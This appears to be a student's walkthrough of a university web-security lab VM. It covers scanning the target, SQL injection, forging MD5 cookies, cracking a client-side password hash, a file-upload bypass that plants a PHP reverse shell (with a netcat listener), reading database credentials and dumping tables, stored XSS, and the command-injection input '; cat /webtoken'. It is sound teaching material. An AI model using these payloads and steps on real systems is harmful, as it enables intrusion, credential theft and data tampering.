# Additional Web Security VM

We are given a virtual machine which hosts a web server, and a list of tasks. To start with we want to find the "Sensible Furniture" website.

## Finding the website
The virtual machine is running on our `dirtylan`. To start with, we need to find it's IP address. I performed a scan of the network with `sudo nmap -sP 10.6.66.0/24`, which revealed:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 18:37 GMT
Nmap scan report for 10.6.66.1
Host is up (0.00021s latency).
MAC Address: 08:00:27:9A:E5:DB (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.6.66.66
Host is up (0.00046s latency).
MAC Address: 08:00:27:53:40:95 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.6.66.64
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.05 seconds
```
We know that `10.6.66.1` is our DHCP server, and that `10.6.66.67` is our `kali-vm`, leaving `10.6.66.66` to be our target.

I also performed a quick scan of the ports open on this machine with `sudo nmap -sS -p0-65535 10.6.66.66`:
```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
143/tcp   open  imap
5001/tcp  open  commplex-link
5003/tcp  open  filemaker
11337/tcp open  unknown
11338/tcp open  unknown
57583/tcp open  unknown
```
We know we are targetting a web application, so I scanned port 80 more closely with `sudo nmap -sSV -p80 10.6.66.66`:
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
```
I also tried looking at ports 11337, 11338 and 57583 more closely, but nmap was unable to identify them. These are probably custom services written by the creators of the vm.

To find the website, I tried visiting `http://10.6.66.66/` in my web-browser to see if I could get more information. This seems to get us to the "Sensible Furniture" website we are looking for, so we are now ready to start the challenges.

## Investigate the products
**Goal:** Find a SQL injection attack that makes the site display all of the products it has in the database. One of the products that is not normally displayed includes a token, submit this token to the token submission website.

Switching to the products tab, we can see that 3 things are displayed. The way the query seems to work is by checking if the entry contains the letter we submit in the search bar. Presumably, it also filters out 'hidden' products. To start with, we tried a simple sql payload from tutorial 5: `a' OR 1; -- `. This worked (pog). We can see that 11 results are returned, and result `#11` contains the token `75e21b431acd4e18ef2533b32b77d0ab`.

## Get access to the hidden site
**Goal:** Investigate the website’s cookies and find a way to get access to the hidden content on the site using an account you have created on the website yourself. You will find a token displayed on the main page of the hidden site, submit this token. (Hint: remember that if a hash is not “salted” it can be vulnerable to an offline dictionary attack.)

To start with we created a dummy account. After signing in, we noticed 2 cookies, a `PHPSESSID` (standard) and `040ec1ee950ffc53291f6df0ffc30325`, which mapped to `cfcd208495d565ef66e7dff9f98764da`. From the hint (and from how they look), these values seem hashed. To try and decrypt them, an [online decryption tool](https://crackstation.net/) was used. It revealed that these actually represent the key-value pair `dealer:0` hashed with `md5`. This seems like a flag, where `dealer` can be set to low (0) or high (1). We tried changing the value to 1, and that failed we hashed 1 with the `md5` algorithm, which produced `c4ca4238a0b923820dcc509a6f75849b`. After setting our cookie to this new value and refreshing the page, we were able to access the hidden site "The Cotton Highway". The welcome page contains the token `09a00bf78ad832a4788b8f9af18e16ec`.

## Escalating your privileges
**Goal:** Find the admin control panel, and from here log into the User Management page by finding the password. On this page you will find another token, submit this.

We first navigated to the admin panel (clicking on our username and selecting admin), then selecting user management. From here, we're greated with a text box and prompted to enter a password. The first try was `password`. We noticed that no requests are being made when we try and submit the password, which implies processing is done client side. We investigated the source code. We first searched for 'password' to find html element which hopefully corresponded to the form. Below that, we found a `<script>` containing JavaScript code which was clearly obfuscated. Copying this code into an online [beautifier](https://beautifier.io/), we can see it corresponds to the following code:
```JavaScript
$(document)['ready'](function() {
    s1 = document['createElement']('script');
    s1['src'] = '/js/md5.js';
    s1['onload'] = function() {
        s2 = document['createElement']('script');
        s2['src'] = '/js/enc-base64-min.js';
        document['body']['appendChild'](s2);
    };
    document['body']['appendChild'](s1);
    $('#login')['on']('submit', function() {
        v = $('#password')['val']();
        h1 = CryptoJS.MD5(v).toString(CryptoJS['enc'].Hex);
        if (h1 == 'e2077d878327026c3cc4e35a6e7037d7') {
            p = CryptoJS['enc']['Base64']['parse']('cDRyNG0zNzNy').toString(CryptoJS['enc'].Latin1);
            h2 = CryptoJS.MD5(v + h1).toString(CryptoJS['enc'].Hex);
            document['location'] = '/admin/users.php?' + p + '=' + h2;
        };
        return false;
    });
});
```
Focusing on the `#login` snippet, we can see that our input to the password field `v` is hashed using `CryptoJS.MD5`, and then checked against a specific hash. If the hashes match, then we are redirected to the admin page (presumably with admin permissions). Using our [online decryption tool](https://crackstation.net/) again, we can see that this hash corresponds to `monkey95`. If we submit this into the password field, we are authenticated and re-directed to the User Management page, which contains the token `03aa59671c3672b05252743730fcb335`.

## Get access to the database
**Goal:** Find a file upload attack and use it to upload some php that lets you view the source code of the mysql.php page. On this page you will find the SQL database password. Use this to access the database where you will find another token. Submit this token to the token submission website.

The first step in this problem is to find an avenue to upload files. From the administrator panel, we notice the 'add new products' tab, which brings us to an option to add a new item (and upload an image as a part of it). This seems like the ideal vector of attack. To try and find the mysql.php page, I've decided to create a [payload](reverse_shell.php) that opens a reverse shell inside my `kali-vm`, which will allow me to execute any bash commands I'd like. I set up burpsuite to intercept my request. After intercepting the request, I noticed there are 2 relevant sections to change. The `Content-Type` of the request needs to be updated to `image/jpeg` to try and trick the server. Also, at the bottom of the request, we can see the filename that the file will be saved as on the web server. This needs to be updated to have the right file extension (I called it `reverse_shell.php`).

After uploading this, we can navigate to our uploaded file at `http://10.6.66.66/img/uploads/reverse_shell.php`. By first running `nc -lvp 42069`, then navigating to the page, our reverse shell is set up. By running `locate mysql.php`, we find the file path to our file. After running `cat` on the file, we now have the contents of `mysql.php`:
```php
// create a connection the database engine
$db = mysql_connect("127.0.0.1", "csecvm", "H93AtG6akq");
if(!$db)
  die("Couldn't connect to the MySQL server.");

// change database
$use = mysql_select_db("csecvm", $db);
if(!$use)
  die("Couldn't select database.");
```

We now have the following information:
- Database address `127.0.0.1` (localhost)
- Username `csecvm`
- Password `H93AtG6akq`
- Database name `csecvm`

From here, we can now query the database using the following command:
```
$ mysql -h "{hostname}" -u "{username}" -p "{database_name}" -e "{SQL_query}"
```
After submitting this query, we will be prompted for the password, which we need to submit. However, since we're using a reverse shell, we will not be able to see this prompt, and therefore just need to submit the password after submitting the query.

To start with I wanted to gather more information about the database, so I ran:
```
mysql -h "127.0.0.1" -u "csecvm" -p "csecvm" -e "SELECT DISTINCT table_schema FROM information_schema.columns"

table_schema
information_schema
csecvm
mysql
performance_schema
sys
```
The schema we are most likely interested in is `csecvm`, so I looked at this one more closely:
```
mysql -h "127.0.0.1" -u "csecvm" -p "csecvm" -e "SELECT table_name, column_name FROM information_schema.columns WHERE table_schema='csecvm'"

table_name      column_name
basket          user_id
basket          product_id
basket          quantity
orders          id
orders          user_id
orders          date
orders          cc
orders          cvv
orders          expire
orders          outfordelivery
orders_items    id
orders_items    order_id
orders_items    product_id
orders_items    quantity
orders_items    price
products        id
products        name
products        image
products        description
products        price
products        danger
token           token
users           id
users           name
users           full
users           password
users           is_dealer
users           email
users           killed_on
users           killed_by
```
From here, we notice the `token` table. If we print out its contents, we obtain:
```
mysql -h "127.0.0.1" -u "csecvm" -p "csecvm" -e "SELECT * FROM csecvm.token"

token
56ce367c12438b50275a38f59ea8f560
```
We've now found the token `56ce367c12438b50275a38f59ea8f560`.

For good measure, I also updated my account to be a dealer so that I don't need to manually reset my cookie to access the hidden webpage:
```
mysql -h "127.0.0.1" -u "csecvm" -p "csecvm" -e "UPDATE csecvm.users SET is_dealer=1 WHERE name='sitra'"
```
## Stored XSS
**Goal"** Find a stored XSS on one of the pages of the website and use it to deliver a payload that will raise an alert ”XSS!” when the vulnerable page is visited. There is no token for this exercise.

In the contact tab of the webpage, we can submit a contact form, containing a Name, Email and Message field. We can then view these messages from the Administrator portal. After submitting a test message, we checked how the messages are displayed:
```html
<label>Name</label>
<input name="name" type="text" disabled="disabled" value="test">
<label>Email</label>
<input name="email" type="email" disabled="disabled" value="test@bham.ac.uk">
<label>Message</label>
<textarea disabled="disabled" name="message" rows="3" style="width:400px">' alert(1);</textarea>
```

We first tried to target message, but it seems that `<>` are escaped, as our `<script>` tags are printed literally. The next approach was in title. We can escape the `value` attribute with a `"`, close the tag with `>` and then insert arbitrary javascript code. If we use the payload `test"><script>alert('XXS!')</script>`, once we open the message in the received message view, our XXS triggers.

## Shell injection
**Goal:** Find a shell code injection attack on the website and use it to view the file /webtoken. Submit this to the token website. (Note: reading the token by exploiting the file upload vulnerability of exercise (4) above is not what you are asked here.)

On the admin panel, we can choose 'see file uploads'. This presents us with an option to change the path, which then changes the files that are listed. Presumably, our input is inserted as the argument of a `ls`, which is executed and then the result is displayed. If we try a simple command injection `; echo hello`, we can see that `hello` is appended to the bottom of our output. If we try `; cat /webtoken`, we obtain our token `e9ea593a5cfcdb247575c6442750c79e`.
